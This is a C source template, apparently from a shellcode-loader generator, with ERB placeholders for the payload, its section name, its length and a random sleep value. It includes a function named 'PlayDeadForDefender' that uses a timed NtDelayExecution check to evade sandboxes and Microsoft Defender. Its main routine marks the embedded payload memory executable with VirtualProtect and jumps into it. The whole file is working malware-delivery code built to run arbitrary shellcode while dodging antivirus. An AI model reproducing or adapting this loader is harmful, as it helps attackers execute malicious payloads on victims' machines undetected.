auto bPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;


int PlayDeadForDefender()
{

    DWORD               dwMilliSeconds        = <%=  random_sleep %>;
	  LARGE_INTEGER       DelayInterval         = { 0 }; 
	  LONGLONG            Delay                 = 0; 
    NTSTATUS            STATUS                = 0;
    DWORD               _T0                   = 0, 
                        _T1                   = 0;
        
    Delay = dwMilliSeconds * 10000;
	  DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount();
    
    STATUS = CALL_EXPORT("ntdll.dll", "NtDelayExecution", int(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
    if (STATUS != 0) {
      return 0;
    }
    
    _T1 = GetTickCount();

    if (_T1 - _T0 < dwMilliSeconds) {
        return 0;
    }

    return 1;
}


int main() {

    DWORD dwOldProtect;

    unsigned long scsize = <%= payload_length %>;
    
//    if( !CALL(&PlayDeadForDefender) )
//    {
//      return 1;
//    }

    char * payload_fnc = (char*)bPayload;
    asm("int3");

    if(!VirtualProtect(bPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
      return 1;
    }
	
    asm("int3");
    (*(void (*)()) payload_fnc)();

	  return 0;
}

